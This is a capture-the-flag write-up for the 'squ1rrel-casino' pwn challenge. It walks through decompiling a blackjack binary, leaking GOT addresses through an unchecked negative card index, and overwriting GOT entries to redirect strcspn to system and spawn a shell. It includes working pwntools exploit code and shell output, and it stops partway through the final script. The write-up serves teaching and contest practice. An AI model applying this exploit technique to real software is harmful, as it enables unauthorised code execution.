# pwn/squ1rrel-casino (15 solves, 487 points)

## description

> the house always wins  
  nc 20.84.72.194 5004

## attachments

[`casino`](./casino)
```
casino: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=840f6b62cade229a41979085467c5944e4b0f585, for GNU/Linux 3.2.0, not stripped
```

[`Dockerfile`](./Dockerfile)
```
Dockerfile: ASCII text, with CRLF line terminators
```

## decompilation

Since there's no C source, let's start by popping `casino` into a decompiler and see
what we get. I'm using Binary Ninja for this, but Ghidra or IDA should both work.

### functions:

```
int64_t get_card_name(char arg1)
uint64_t get_card_value(char arg1) __pure
uint64_t get_card(void* arg1, int32_t arg2)
void* set_card(void* arg1, int32_t arg2, char arg3)
uint64_t draw_card()
int64_t view_card()
int64_t replace_card()
int64_t play_blackjack()
int64_t show_balance()
char* initialize_game()
int32_t main(int32_t argc, char** argv, char** envp)
```

### `main`:

```
00001d1c  int32_t main(int32_t argc, char** argv, char** envp)

00001d28      void* fsbase
00001d28      int64_t rax = *(fsbase + 0x28)
00001d46      setbuf(fp: stdout, buf: nullptr)
00001d5a      setbuf(fp: stdin, buf: nullptr)
00001d6b      srand(x: time(nullptr))
00001d75      initialize_game()
00001d84      while (true)
00001d84          puts(str: "\n=== Squ1rrel Casino Menu ===")
00001d93          puts(str: "1. Play Blackjack")
00001da2          puts(str: "2. Show Balance")
00001db1          puts(str: "3. Exit")
00001dc5          printf(format: "Choose an option: ")
00001de8          int32_t var_3c
00001de8          if (__isoc99_scanf(format: &data_205d, &var_3c) != 1)
00001df4              puts(str: "Invalid input!")
00001e02              int32_t i
00001e02              do
00001dfa                  i = getchar()
00001dfa              while (i != 0xa)
00001e12          else
00001e12              int32_t i_1
00001e12              do
00001e0a                  i_1 = getchar()
00001e0a              while (i_1 != 0xa)
00001e14              int32_t rax_6 = var_3c
00001e1a              if (rax_6 == 3)
00001e1a                  break
00001e28              if (rax_6 == 1)
00001e39                  play_blackjack()
00001e3e                  continue
00001e2d              else if (rax_6 == 2)
00001e48                  show_balance()
00001e4d                  continue
00001ece              puts(str: "Invalid option!")
00001e5c      puts(str: "Thanks for playing at the Squ1rr…")
00001e6d      int64_t t_1
00001e6d      gettimeofday(&t_1, nullptr)
00001e76      int64_t t = t_1
00001e81      struct tm* rax_10 = localtime(t: &t)
00001ea9      printf(format: "But it's only %02d:%02d! Surely …", zx.q(rax_10->tm_hour), zx.q(rax_10->tm_min))
00001eb7      *(fsbase + 0x28)
00001ec0      if (rax == *(fsbase + 0x28))
00001ede          return 0
00001ed8      __stack_chk_fail()
00001ed8      noreturn
```

`main` seems to be mostly for control flow, calling into the various functions
and providing a menu. Let's first take a look at `initialize_game`:

## `initialize_game`:

```
00001ca2  char* initialize_game()

00001caa      player = 0x64
00001cb4      data_40a4 = 0
00001ccd      printf(format: "Enter your name: ")
00001ceb      char* rax_1 = fgets(buf: &data_40a8, n: 0x40, fp: stdin)
00001cf3      if (rax_1 != 0)
00001d09          rax_1 = strcspn(&data_40a8, &data_22f5)
00001d15          *(rax_1 + &data_40a8) = 0
00001d1b      return rax_1
```

This seems to be a very simple function, which asks the player for their name
and reads it into a buffer, cleaning up the newline. No buffer overflows here.

## `show_balance`:

```
00001c5f  int64_t show_balance()

00001c7e      printf(format: "Current balance: $%d\n", zx.q(player))
00001ca1      return printf(format: "Win count: %d\n", zx.q(data_40a4))
```

Even less of anything interesting. No format string vulnerabilities or buffer
overflows.

## `play_blackjack`

Who would've guessed that in a blackjack challenge, `play_blackjack` would be
interesting? :P

```
00001819  int64_t play_blackjack()

0000182a      void* fsbase
0000182a      int64_t rax = *(fsbase + 0x28)
0000183e      char rax_2 = draw_card()
0000184b      char rax_4 = draw_card()
00001858      char rax_6 = draw_card()
00001865      char rax_8 = draw_card()
0000187c      data_40e8 = rax_2 | rax_4 << 4
0000189b      printf(format: "\nWelcome to Blackjack, %s!\n", &data_40a8)
000018b7      printf(format: "Your balance: $%d\n", zx.q(player))
000018c6      puts(str: "\nYour cards:")
000018d5      get_card_name(rax_2)
000018ee      printf(format: "Card 1: %s (0x%X)\n", &name.0, zx.q(rax_2))
000018fd      get_card_name(rax_4)
00001916      printf(format: "Card 2: %s (0x%X)\n", &name.0, zx.q(rax_4))
00001925      get_card_name(rax_6)
0000193e      printf(format: "Dealer's face-up card: %s (0x%X)…", &name.0, zx.q(rax_6))
00001943      char var_43 = 1
00001951      while (true)
00001951          puts(str: "\nOptions:")
00001960          puts(str: "1. View a card")
00001969          if (var_43 != 0)
00001975              puts(str: "2. Replace a card (once per game…")
00001984          puts(str: "3. Stand (end your turn)")
00001993          puts(str: "4. Exit game")
000019a7          printf(format: "Choose an option: ")
000019ca          int32_t var_3c
000019ca          if (__isoc99_scanf(format: &data_205d, &var_3c) != 1)
000019d6              puts(str: "Invalid input!")
000019e4              int32_t i
000019e4              do
000019dc                  i = getchar()
000019dc              while (i != 0xa)
000019eb          else
000019eb              int32_t rax_25 = var_3c
000019f1              if (rax_25 == 4)
000019f1                  break
000019fa              if (rax_25 s> 4)
00001c24                  label_1c24:
00001c24                  puts(str: "Invalid option!")
00001a03              else if (rax_25 == 3)
00001a64                  get_card_name(rax_8)
00001a76                  get_card_name(rax_6)
00001a95                  printf(format: "\nDealer's cards: %s (0x%X) and …", &name.0, zx.q(rax_6), &name.0, zx.q(rax_8))
00001aa1                  char rax_32 = data_40e8 & 0xf
00001aae                  uint8_t rax_33 = data_40e8 u>> 4
00001aba                  int32_t rax_35 = get_card_value(rax_32)
00001ace                  int32_t var_38_1 = get_card_value(rax_33) + rax_35
00001ad7                  int32_t rax_40 = get_card_value(rax_6)
00001aeb                  int32_t var_34_1 = get_card_value(rax_8) + rax_40
00001afe                  if (var_38_1 s> 0x15 && (rax_32 == 1 || (rax_32 != 1 && rax_33 == 1)))
00001b00                      var_38_1 = var_38_1 - 0xa
00001b14                  if (var_34_1 s> 0x15 && (rax_6 == 1 || (rax_6 != 1 && rax_8 == 1)))
00001b16                      var_34_1 = var_34_1 - 0xa
00001b2e                  printf(format: "Your total: %d\n", zx.q(var_38_1))
00001b47                  printf(format: "Dealer's total: %d\n", zx.q(var_34_1))
00001b50                  if (var_38_1 s> 0x15)
00001b5c                      puts(str: "You bust! Dealer wins.")
00001b6a                      player = player - 0xa
00001b79                  else if (var_34_1 s> 0x15)
00001b85                      puts(str: "Dealer busts! You win!")
00001b93                      player = player + 0x14
00001ba2                      data_40a4 = data_40a4 + 1
00001bb0                  else if (var_38_1 s> var_34_1)
00001bbc                      puts(str: "You win!")
00001bca                      player = player + 0x14
00001bd9                      data_40a4 = data_40a4 + 1
00001be7                  else if (var_34_1 s<= var_38_1)
00001c13                      puts(str: "It's a tie!")
00001bf3                  else
00001bf3                      puts(str: "Dealer wins.")
00001c01                      player = player - 0xa
00001a08              else
00001a08                  if (rax_25 s> 3)
00001a08                      goto label_1c24
00001a11                  if (rax_25 == 1)
00001a22                      view_card()
00001a16                  else
00001a16                      if (rax_25 != 2)
00001a16                          goto label_1c24
00001a30                      if (var_43 == 0)
00001a4f                          puts(str: "You've already replaced a card t…")
00001a37                      else
00001a37                          replace_card()
00001a3c                          var_43 = 0
00001c2f          if (var_3c == 3)
00001c2f              break
00001c37          if (var_3c == 4)
00001c37              break
00001c37          if (not(var_3c != 3 && var_3c != 4))
00001c2c              nop
00001c4d      if (rax == *(fsbase + 0x28))
00001c5e          return rax - *(fsbase + 0x28)
00001c4f      __stack_chk_fail()
00001c4f      noreturn
```

There's a lot to take in here, but this boils down to providing us with a few
options:

1. View one of our cards by calling `view_card`
2. Replace one of our cards with a new card by calling `replace_card`
3. Stand and play out the game
4. Exit the game

Otherwise, it's more control flow and menus. Nothing vulnerable here either.

## `view_card`

```
00001613  int64_t view_card()

00001620      void* fsbase
00001620      int64_t rax = *(fsbase + 0x28)
0000163e      printf(format: "Which card to view? ")
00001661      int32_t var_2c
00001661      if (__isoc99_scanf(format: &data_205d, &var_2c) == 1)
00001685          var_2c = var_2c - 1
0000168e          if (var_2c s> 2)
000016eb              puts(str: "Not your card!")
000016a7          else
000016a7              char rax_7 = get_card(&hand, var_2c)
000016b9              get_card_name(rax_7)
000016da              printf(format: "Card #%d: %s (0x%X)\n", zx.q(var_2c + 1), &name.0, zx.q(rax_7))
0000166d      else
0000166d          puts(str: "Invalid input!")
0000167b          int32_t i
0000167b          do
00001673              i = getchar()
00001673          while (i != 0xa)
000016fd      if (rax == *(fsbase + 0x28))
00001709          return rax - *(fsbase + 0x28)
000016ff      __stack_chk_fail()
000016ff      noreturn
```

Here, the code asks us for an index of a card to view. We enter a one-indexed number,
which it converts to a zero-indexed number, then checks if it's greater than 2.

Hmm...

```
Options:
1. View a card
2. Replace a card (once per game)
3. Stand (end your turn)
4. Exit game
Choose an option: 1
Which card to view? -8
Card #-8: Unknown (0x0)
```

(there is also the weird case that you can enter card 3 and read just off the end.
i do not know of a good use for this)

Okay, so we indexed into... something. But what?

## `get_card`

```
000014fa  uint64_t get_card(void* arg1, int32_t arg2)

00001525      char rax_6 = *(arg1 + sx.q((arg2 + (arg2 u>> 0x1f)) s>> 1))
00001533      uint64_t rax_10
00001533      if ((arg2 & 1) != 0)
00001542          rax_10.b = rax_6 u>> 4
00001539      else
00001539          rax_10 = zx.q(zx.d(rax_6) & 0xf)
00001546      return rax_10
```

Here, we see that we're indexing into the `hand` array. This is allocated in
the ELF's original memory, and starts pre-filled with zeroes. Our cards are stored
as the hex nibbles (4 bits) of each byte in the array, so our hand of two cards
only uses one byte.

Thus, if we start indexing negative, we could potentially read out of bounds. But
what lies *before* us? Let's look at the executable layout in `gdb`:

```
Your cards:
Card 1: Four (4) (0x4)
Card 2: Three (3) (0x3)
Dealer's face-up card: Ten (10) (0xA)

Options:
1. View a card
2. Replace a card (once per game)
3. Stand (end your turn)
4. Exit game
Choose an option: 1
Which card to view? -8

Breakpoint 1, 0x0000555555555502 in get_card ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
─────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]──────────────────────────────────────────
 RAX  0x5555555580e8 (player+72) ◂— 0x34 /* '4' */
 RBX  0xa
 RCX  0
 RDX  0xfffffff7
 RDI  0x5555555580e8 (player+72) ◂— 0x34 /* '4' */
 RSI  0xfffffff7
 R8   3
 R9   0
 R10  0
 R11  0xa
 R12  1
 R13  0
 R14  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
 R15  0x555555557dd8 (__do_global_dtors_aux_fini_array_entry) —▸ 0x555555555280 (__do_global_dtors_aux) ◂— endbr64
 RBP  0x7fffffffe7f0 —▸ 0x7fffffffe830 —▸ 0x7fffffffe880 —▸ 0x7fffffffe8d0 —▸ 0x7fffffffe970 ◂— ...
 RSP  0x7fffffffe7f0 —▸ 0x7fffffffe830 —▸ 0x7fffffffe880 —▸ 0x7fffffffe8d0 —▸ 0x7fffffffe970 ◂— ...
 RIP  0x555555555502 (get_card+8) ◂— mov qword ptr [rbp - 0x18], rdi
──────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]───────────────────────────────────────────────────
 ► 0x555555555502 <get_card+8>     mov    qword ptr [rbp - 0x18], rdi     [0x7fffffffe7d8] <= 0x5555555580e8 (player+72) ◂— 0x34 /* '4' */
   0x555555555506 <get_card+12>    mov    dword ptr [rbp - 0x1c], esi     [0x7fffffffe7d4] <= 0xfffffff7
   0x555555555509 <get_card+15>    mov    eax, dword ptr [rbp - 0x1c]     EAX, [0x7fffffffe7d4] => 0xfffffff7
   0x55555555550c <get_card+18>    mov    edx, eax                        EDX => 0xfffffff7
   0x55555555550e <get_card+20>    shr    edx, 0x1f
   0x555555555511 <get_card+23>    add    eax, edx                        EAX => 0xfffffff8 (0xfffffff7 + 0x1)
   0x555555555513 <get_card+25>    sar    eax, 1
   0x555555555515 <get_card+27>    mov    dword ptr [rbp - 4], eax        [0x7fffffffe7ec] <= 0xfffffffc
   0x555555555518 <get_card+30>    mov    eax, dword ptr [rbp - 4]        EAX, [0x7fffffffe7ec] => 0xfffffffc
   0x55555555551b <get_card+33>    movsxd rdx, eax                        RDX => 0xfffffffffffffffc
   0x55555555551e <get_card+36>    mov    rax, qword ptr [rbp - 0x18]     RAX, [0x7fffffffe7d8] => 0x5555555580e8 (player+72) ◂— 0x34 /* '4' */
────────────────────────────────────────────────────────────────[ STACK ]────────────────────────────────────────────────────────────────
00:0000│ rbp rsp 0x7fffffffe7f0 —▸ 0x7fffffffe830 —▸ 0x7fffffffe880 —▸ 0x7fffffffe8d0 —▸ 0x7fffffffe970 ◂— ...
01:0008│+008     0x7fffffffe7f8 —▸ 0x5555555556ac (view_card+153) ◂— mov byte ptr [rbp - 0x25], al
02:0010│+010     0x7fffffffe800 ◂— 0x3b9d6bd0ffffe830
03:0018│+018     0x7fffffffe808 ◂— 0xfffffff70000000a /* '\n' */
04:0020│+020     0x7fffffffe810 —▸ 0x5555555580e8 (player+72) ◂— 0x34 /* '4' */
05:0028│+028     0x7fffffffe818 ◂— 0xc8f4c29d24f7b000
06:0030│+030     0x7fffffffe820 —▸ 0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
07:0038│+038     0x7fffffffe828 ◂— 0xa /* '\n' */
──────────────────────────────────────────────────────────────[ BACKTRACE ]──────────────────────────────────────────────────────────────
 ► 0   0x555555555502 get_card+8
   1   0x5555555556ac view_card+153
   2   0x555555555a27 play_blackjack+526
   3   0x555555555e3e main+290
   4   0x7ffff7dd2488 __libc_start_call_main+120
   5   0x7ffff7dd254c __libc_start_main+140
   6   0x555555555205 _start+37
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```

Here, we see that we're calling `get_card` with `rdi=0x5555555580e8`. Dumping memory there shows our cards!

```
pwndbg> x/16bx $rdi
0x5555555580e8 <player+72>:	0x34	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555555580f0:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

If we're indexing backwards, we should start looking at what lies before this address.

```
pwndbg> x/256bx $rdi-256
0x555555557fe8:	0xe0	0x3d	0x00	0x00	0x00	0x00	0x00	0x00
0x555555557ff0:	0x10	0xe3	0xff	0xf7	0xff	0x7f	0x00	0x00
0x555555557ff8:	0x60	0x8c	0xfd	0xf7	0xff	0x7f	0x00	0x00
0x555555558000 <localtime@got.plt>:	0x30	0x50	0x55	0x55	0x55	0x55	0x00	0x00
0x555555558008 <puts@got.plt>:	0x60	0xd3	0xe2	0xf7	0xff	0x7f	0x00	0x00
0x555555558010 <__stack_chk_fail@got.plt>:	0x50	0x50	0x55	0x55	0x55	0x55	0x00	0x00
0x555555558018 <setbuf@got.plt>:	0x30	0x4b	0xe3	0xf7	0xff	0x7f	0x00	0x00
0x555555558020 <printf@got.plt>:	0x00	0x4e	0xe0	0xf7	0xff	0x7f	0x00	0x00
0x555555558028 <gettimeofday@got.plt>:	0x80	0x50	0x55	0x55	0x55	0x55	0x00	0x00
0x555555558030 <strcspn@got.plt>:	0xc0	0x6a	0xf3	0xf7	0xff	0x7f	0x00	0x00
0x555555558038 <srand@got.plt>:	0x50	0xe0	0xde	0xf7	0xff	0x7f	0x00	0x00
0x555555558040 <fgets@got.plt>:	0x20	0xb2	0xe2	0xf7	0xff	0x7f	0x00	0x00
0x555555558048 <getchar@got.plt>:	0xf0	0x44	0xe3	0xf7	0xff	0x7f	0x00	0x00
0x555555558050 <time@got.plt>:	0x70	0x4b	0xfc	0xf7	0xff	0x7f	0x00	0x00
0x555555558058 <__isoc99_scanf@got.plt>:	0x10	0x4b	0xe0	0xf7	0xff	0x7f	0x00	0x00
0x555555558060 <rand@got.plt>:	0xf0	0xdf	0xde	0xf7	0xff	0x7f	0x00	0x00
0x555555558068:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x555555558070:	0x70	0x80	0x55	0x55	0x55	0x55	0x00	0x00
0x555555558078:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x555555558080 <stdout@GLIBC_2.2.5>:	0xc0	0x45	0xf9	0xf7	0xff	0x7f	0x00	0x00
0x555555558088:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x555555558090 <stdin@GLIBC_2.2.5>:	0xe0	0x38	0xf9	0xf7	0xff	0x7f	0x00	0x00
0x555555558098 <completed.0>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555555580a0 <player>:	0x64	0x00	0x00	0x00	0x00	0x00	0x00	0x00
0x5555555580a8 <player+8>:	0x74	0x77	0x6f	0x73	0x68	0x65	0x65	0x70
0x5555555580b0 <player+16>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
(bunch of zeros)
0x5555555580e0 <player+64>:	0x00	0x00	0x00	0x00	0x00	0x00	0x00	0x00
```

Our GOT entries!

## GOT ya

Since `casino` is a dynamically linked executable, we utilize the Global Offset Table to resolve `libc` functions
to the correct address at runtime. If we look at these entries in the original ELF, we see they are all populated
with dummy values. However, at runtime, we see that these are resolved to their actual function addresses:

```
pwndbg> p puts
$1 = {int (const char *)} 0x7ffff7e2d360 <__GI__IO_puts>
```

However, not all of these are correct. Some of them, such as `localtime`, are set to `0x555555555030`, which isn't
the actual function!

```
pwndbg> p localtime
$2 = {struct tm *(const time_t *)} 0x7ffff7e80720 <__GI_localtime>
```

This is because we haven't called this function yet. Since we don't want to burden the program with initializing
every single libc function's address at startup, we'll only put the addresses in the GOT when we need to. This
self-modifying GOT allows us to quickly call commonly-used libc functions, without burdening startup time by loading
every single function up front.

## Plan of Attack:

Now that we see how we can get out-of-bounds memory access, let's plan our attack:

```
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        PIE enabled
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```

NX is on, so we can't write shellcode into our buffer. ASLR is also on, so we need
to work out a way to bypass that as well.

### ASLR Bypass:

There are two important offsets for ASLR that we need to get: the executable's ASLR and
the libc ASLR.

```
pwndbg> vmmap
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
             Start                End Perm     Size Offset File
    0x555555554000     0x555555555000 r--p     1000      0 /home/doubledelete/Desktop/ctf-2025/squ1rrelctf-2025/pwn/casino/casino
    0x555555555000     0x555555556000 r-xp     1000   1000 /home/doubledelete/Desktop/ctf-2025/squ1rrelctf-2025/pwn/casino/casino
    0x555555556000     0x555555557000 r--p     1000   2000 /home/doubledelete/Desktop/ctf-2025/squ1rrelctf-2025/pwn/casino/casino
    0x555555557000     0x555555558000 r--p     1000   2000 /home/doubledelete/Desktop/ctf-2025/squ1rrelctf-2025/pwn/casino/casino
    0x555555558000     0x555555559000 rw-p     1000   3000 /home/doubledelete/Desktop/ctf-2025/squ1rrelctf-2025/pwn/casino/casino
    0x7ffff7da8000     0x7ffff7dab000 rw-p     3000      0 [anon_7ffff7da8]
    0x7ffff7dab000     0x7ffff7dcf000 r--p    24000      0 /usr/lib/libc.so.6
    0x7ffff7dcf000     0x7ffff7f40000 r-xp   171000  24000 /usr/lib/libc.so.6
    0x7ffff7f40000     0x7ffff7f8f000 r--p    4f000 195000 /usr/lib/libc.so.6
    0x7ffff7f8f000     0x7ffff7f93000 r--p     4000 1e3000 /usr/lib/libc.so.6
    0x7ffff7f93000     0x7ffff7f95000 rw-p     2000 1e7000 /usr/lib/libc.so.6
    0x7ffff7f95000     0x7ffff7f9f000 rw-p     a000      0 [anon_7ffff7f95]
    0x7ffff7fc0000     0x7ffff7fc2000 r--p     2000      0 [vvar]
    0x7ffff7fc2000     0x7ffff7fc4000 r--p     2000      0 [vvar_vclock]
    0x7ffff7fc4000     0x7ffff7fc6000 r-xp     2000      0 [vdso]
    0x7ffff7fc6000     0x7ffff7fc7000 r--p     1000      0 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7fc7000     0x7ffff7ff0000 r-xp    29000   1000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ff0000     0x7ffff7ffb000 r--p     b000  2a000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffb000     0x7ffff7ffd000 r--p     2000  34000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffd000     0x7ffff7ffe000 rw-p     1000  36000 /usr/lib/ld-linux-x86-64.so.2
    0x7ffff7ffe000     0x7ffff7fff000 rw-p     1000      0 [anon_7ffff7ffe]
    0x7ffffffde000     0x7ffffffff000 rw-p    21000      0 [stack]
    0xffffffffff600000 0xffffffffff601000 --xp     1000      0 [vsyscall]
```

Here, we see that the executable is contiguously mapped at 0x555555554000, and
libc is contiguously mapped at 0x7ffff7dab000. Since this is a debugging environment,
we won't see ASLR's effects, but it will cause these to shift in a real run.

To leak these ASLR offsets, we can use a negative card index to leak addresses in
the GOT, half a byte at a time. Let's set up a function for that.

```python
def read64(r, offset):
    result = 0x0
    shift = 0
    for i in range(offset, offset+16):
        # view a card
        r.sendlineafter(b'option: ', b'1')
        r.sendlineafter(b'view? ', str(i).encode())
        value = int(r.recvline().split(b'(')[-1].strip()[2:-1], 16)
        result |= (value << (shift ^ 4))
        shift += 4
    return result
```

We want to use this to read an uninitialized function, such as `localtime`, to get
the executable's ASLR offset, as well as an initialized function, such as `puts`, to
get the libc ASLR offset.

```python
def main():
    r = conn()
    r.sendlineafter(b'name: ', b'meow')

    # start a game
    r.sendlineafter(b'option: ', b'1')

    # aslr leak
    localtime = read64(r, -464)
    print(hex(localtime))

    # libc leak
    puts = read64(r, -448)
    print(hex(puts))
```

However, these leaks aren't useful if we can't write any data.

### Writing Cards (ft. gambling)

If we look more at the code, we realize we also have the option, once a game,
to replace a card. This allows us to replace a card at an index with a randomly
drawn card.

```
0000170a  int64_t replace_card()

00001717      void* fsbase
00001717      int64_t rax = *(fsbase + 0x28)
00001735      printf(format: "Which card index to replace? ")
00001758      int32_t var_2c
00001758      if (__isoc99_scanf(format: &data_205d, &var_2c) == 1)
0000177f          var_2c = var_2c - 1
00001788          if (var_2c s> 2)
000017fa              puts(str: "Not your card!")
0000178f          else
0000178f              char rax_8 = draw_card()
0000179e              void* var_28_1 = &data_40e8
000017ac              get_card_name(rax_8)
000017c5              printf(format: "Drew new card: %s (0x%X)\n", &name.0, zx.q(rax_8))
000017da              set_card(var_28_1, var_2c, rax_8)
000017e9              puts(str: "Card replaced!")
00001764      else
00001764          puts(str: "Invalid input!")
00001772          int32_t i
00001772          do
0000176a              i = getchar()
0000176a          while (i != 0xa)
0000180c      if (rax == *(fsbase + 0x28))
00001818          return rax - *(fsbase + 0x28)
0000180e      __stack_chk_fail()
0000180e      noreturn
```

Again, we have the same issue with not checking negative indices!

Unfortunately for us, `draw_card` gives us a random number between 1 and 15.

```
000015dc  uint64_t draw_card()

000015e4      int32_t rax = rand()
000015fe      int32_t temp0
000015fe      int32_t temp1
000015fe      temp0:temp1 = sx.q(rax)
00001612      return zx.q(temp1 - (((((sx.q(rax) * -0x77777777) u>> 0x20).d + rax) s>> 3) - temp0) * 0xf + 1)
```

Fortunately for us, ...

![lets go gambling](./letsgogambling.gif)

```python
def write64(r, offset, target):
    i = offset
    shift = 0
    while i != offset + 16:
        # We can't ever draw 0, so just skip it and hope
        if (target >> (shift ^ 4)) & 0xf == 0:
            print('bad')
            i += 1
            shift += 4
            continue
        # WE GAMBLE
        r.sendlineafter(b'option: ', b'2')
        r.sendlineafter(b'replace? ', str(i).encode())
        value = int(r.recvline().split(b'(')[-1].strip()[2:-1], 16)
        # reset game state
        r.sendlineafter(b'option: ', b'4')
        r.sendlineafter(b'option: ', b'1')
        if (target >> (shift ^ 4)) & 0xf == value:
            print(i, value)
            i += 1
            shift += 4
```

we can just keep re-rolling cards until we get what we like. Funny enough, you
can just leave the table! Our balance doesn't even change.

## The Kill

Now that we have a read and write gadget, we can start hijacking control flow. While
we don't have a stack ASLR offset, we can overwrite the GOT entries ourselves to direct
control flow wherever we want when a libc function is called. Let's list the functions here:

```
localtime
puts
__stack_chk_fail
setbuf
printf
gettimeofday
strcspn
srand
fgets
getchar
time
scanf
rand
```

Out of these, we can't use `puts`, `printf`, `getchar`, `scanf`, and `rand` since
they're used during our read/write gadgets, and would segfault before we finish our attack.
It's infeasible to reach `__stack_chk_fail` since we don't even know where the stack is. This
leaves us with:

- `localtime`
- `setbuf`
- `gettimeofday`
- `strcspn`
- `time`

We notice that when we leave `main`, we call:

```
00001e6d      gettimeofday(&t_1, nullptr)
00001e76      int64_t t = t_1
00001e81      struct tm* rax_10 = localtime(t: &t)
00001ea9      printf(format: "But it's only %02d:%02d! Surely …", zx.q(rax_10->tm_hour), zx.q(rax_10->tm_min))
```

This makes a perfect target for our control flow hijacking, since this is the only
place this executable calls `gettimeofday` or `localtime`! I chose to go with `gettimeofday`
for this attack, but I believe either should work.

Using the GOT, we'll overwrite `gettimeofday` to point to...

## `initialize_game` (again)

```
00001ca2  char* initialize_game()

00001caa      player = 0x64
00001cb4      data_40a4 = 0
00001ccd      printf(format: "Enter your name: ")
00001ceb      char* rax_1 = fgets(buf: &data_40a8, n: 0x40, fp: stdin)
00001cf3      if (rax_1 != 0)
00001d09          rax_1 = strcspn(&data_40a8, &data_22f5)
00001d15          *(rax_1 + &data_40a8) = 0
00001d1b      return rax_1
```

The "useless" function returns as the hero of the attack! This is the easiest
function for us to just get data from the user and immediately pass it into a
libc function. We'll keep `fgets` the same, but replace `strcspn` with `system`.
To find the address of `system`, we'll need to calculate it from our libc offset.

## Finding libc

This was an interesting problem I probably overcomplicated, but I'll still put
my method in case it's useful in the future.

After testing locally with my offsets, I ran the exploit on the server, but got
a crash instead. I figured my libc offsets were likely wrong. To work out the libc
version, I started by adding even more logging to some other functions that we know
should be mapped to their real addresses:

```python
    print('setbuf', hex(read64(r, -448+16*2)))
    print('printf', hex(read64(r, -448+16*3)))
    print('fgets', hex(read64(r, -448+16*7)))
    print('getchar', hex(read64(r, -448+16*8)))
```

When we run it against the remote server, we get

```
0x7016f54d2bd0 (puts)
setbuf 0x7016f54da740
printf 0x7016f54ab0f0
fgets 0x7016f54d0b20
getchar 0x7016f54da0f0
```

Now, we can take the low three nibbles (`bd0`, `740`, etc.) and put them into https://libc.rip.
We choose the low three nibbles because they are unaffected by ASLR, which operates at page-level (2^12B).

This allows us to work out that we are on `libc6_2.39`, and `libcdb` even gives us a nice text file with
all of our offsets!

```
puts 0000000000087bd0
system 0000000000058740
```

## The Final Attack

With our read and write gadgets, writing the attack is quite easy:

```python
def main():
    r = conn()
    r.sendlineafter(b'name: ', b'meow')

    # start a game
    r.sendlineafter(b'option: ', b'1')

    # aslr leak
    localtime = read64(r, -464)
    print(hex(localtime))

    initialize_game = localtime + 0xc72
    print('initialize game: ', hex(initialize_game))

    # libc leak
    puts = read64(r, -448)
    print(hex(puts))

    print('setbuf', hex(read64(r, -448+16*2)))
    print('printf', hex(read64(r, -448+16*3)))
    print('fgets', hex(read64(r, -448+16*7)))
    print('getchar', hex(read64(r, -448+16*8)))

    libc = puts - 0x87bd0
    system = libc + 0x58740
    # system = puts + 0x2f450
    print('system: ', hex(system))

    # write to -368: strcspn
    write64(r, -368, system)
    print('wrote strcspn = ', hex(system))

    # write to -384: gettimeofday
    write64(r, -384, initialize_game)
    print('wrote gettimeofday = ', hex(initialize_game))
```

From here, we just need to exit the game, and trigger our `gettimeofdady => initialize_game` call.
Then, we enter our name as `/bin/sh`, calling `strcspn => system`.

```python
    r.sendlineafter(b'option: ', b'4')
    r.sendlineafter(b'option: ', b'3')
    r.sendlineafter(b'name: ', b'/bin/sh')

    r.interactive()
```

```
0x64943190d030
initialize game:  0x64943190dca2
0x7016f54d2bd0
setbuf 0x7016f54da740
printf 0x7016f54ab0f0
fgets 0x7016f54d0b20
getchar 0x7016f54da0f0
system:  0x7016f54a3740
-368 4
bad
-366 3
-365 7
-364 4
-363 10
-362 15
-361 5
-360 1
-359 6
-358 7
bad
bad
bad
bad
bad
wrote strcspn =  0x7016f54a3740
-384 10
-383 2
-382 13
-381 12
-380 9
bad
-378 3
-377 1
-376 9
-375 4
-374 6
-373 4
bad
bad
bad
bad
wrote gettimeofday =  0x64943190dca2
[*] Switching to interactive mode
$ ls
flag.txt
run
$ cat flag.txt
squ1rrel{80%_0f_4ll_g4mbl3rs_qu1t_b3f0r3_th31r_b1g_pwn!}
[*] Got EOF while reading in interactive
```

The final solve script is:

```python
#!/usr/bin/env python3

from pwn import *

exe = ELF("./casino_patched")

context.binary = exe
context.terminal = ['tmux', 'splitw', '-h']
# context.log_level = 'debug'

def conn():
    if args.LOCAL:
        if args.GDB:
            r = gdb.debug([exe.path])
        else:
            r = process([exe.path])
    else:
        r = remote("20.84.72.194", 5004)

    return r


def read64(r, offset):
    result = 0x0
    shift = 0
    for i in range(offset, offset+16):
        # view a card
        r.sendlineafter(b'option: ', b'1')
        r.sendlineafter(b'view? ', str(i).encode())
        value = int(r.recvline().split(b'(')[-1].strip()[2:-1], 16)
        result |= (value << (shift ^ 4))
        shift += 4
    return result


def write64(r, offset, target):
    i = offset
    shift = 0
    while i != offset + 16:
        if (target >> (shift ^ 4)) & 0xf == 0:
            print('bad')
            i += 1
            shift += 4
            continue
        # WE GAMBLE
        r.sendlineafter(b'option: ', b'2')
        r.sendlineafter(b'replace? ', str(i).encode())
        value = int(r.recvline().split(b'(')[-1].strip()[2:-1], 16)
        # reset game state
        r.sendlineafter(b'option: ', b'4')
        r.sendlineafter(b'option: ', b'1')
        if (target >> (shift ^ 4)) & 0xf == value:
            print(i, value)
            i += 1
            shift += 4


def main():
